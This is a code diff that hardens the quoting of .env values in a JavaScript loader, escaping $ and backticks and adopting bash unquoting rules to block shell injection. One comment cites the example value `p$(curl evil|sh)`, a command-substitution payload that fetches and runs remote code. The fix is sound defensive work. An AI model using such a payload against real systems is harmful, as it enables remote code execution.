@@ -33,14 +33,20 @@ if (BIND !== '127.0.0.1' && !ADMIN_PASSWORD) {
 // (see envQuote); the loader strips one layer of matching quotes so bash,
 // systemd EnvironmentFile, and this loader all agree on the value.
 function envQuote(val) {
+  // Double-quote values with whitespace or shell-special chars. Escape \,
+  // ", $, and ` so bash (run-cycle.sh sources .env), systemd
+  // EnvironmentFile, and unquoteEnv() below all agree — and so a value like
+  // `p$(curl evil|sh)` is inert data, never executed.
   if (/[\s"'`$\\#]/.test(val))
-    return '"' + val.replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"';
+    return '"' + val.replace(/\\/g, '\\\\').replace(/"/g, '\\"')
+                    .replace(/\$/g, '\\$').replace(/`/g, '\\`') + '"';
   return val;
 }
 function unquoteEnv(v) {
   v = v.trim();
   if (v.length >= 2 && v[0] === '"' && v[v.length - 1] === '"')
-    return v.slice(1, -1).replace(/\\"/g, '"').replace(/\\\\/g, '\\');
+    // Bash double-quote semantics: backslash is special only before $, `, ", \.
+    return v.slice(1, -1).replace(/\\([$`"\\\n])/g, '$1');
   if (v.length >= 2 && v[0] === "'" && v[v.length - 1] === "'")
     return v.slice(1, -1);
   return v;
